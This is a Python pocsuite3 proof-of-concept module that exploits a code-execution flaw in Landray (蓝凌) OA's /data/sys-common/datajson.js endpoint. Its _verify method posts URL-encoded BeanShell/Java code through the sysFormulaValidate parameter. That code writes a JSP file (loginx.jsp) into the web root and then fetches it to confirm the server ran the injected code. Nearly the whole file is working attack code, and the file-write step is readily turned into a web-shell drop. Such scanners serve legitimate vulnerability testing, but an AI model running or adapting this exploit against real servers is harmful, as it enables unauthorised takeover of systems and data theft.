from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '蓝凌 OA /data/sys-common/datajson.js 存在反序列化漏洞'
    appName = '蓝凌 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''深圳市蓝凌软件股份有限公司 OA 系统存在反序列化漏洞，攻击者可利用该漏洞获取服务器控制权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        filename = "loginx.jsp"
        path = "/data/sys-common/datajson.js"
        data = 's_bean=sysFormulaValidate&script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split("WEB-INF")[0]%2B"/' + filename + '");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer("VGVzdEJ5WnNmVGVzdA=="));fout.close();return%201;&type=int&modelName=test'
        vulurl = self.url+path
        resp = requests.get(url=vulurl, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and '参数s_bean不能为空' in resp.text:
            resp_rce = requests.post(url=vulurl, headers=headers, data=data, verify=False, allow_redirects=False, timeout=10)
            if resp_rce.status_code == 200 and '校验通过' in resp_rce.text:
                path_rce = "/" + filename
                url_rce = self.url+path_rce
                resp_shell = requests.get(url=url_rce, headers=headers, verify=False, allow_redirects=False, timeout=10)
                if 'TestByZsf' in resp_shell.text and resp_shell.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vulurl
                    result['VerifyInfo']['Content'] = url_rce
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
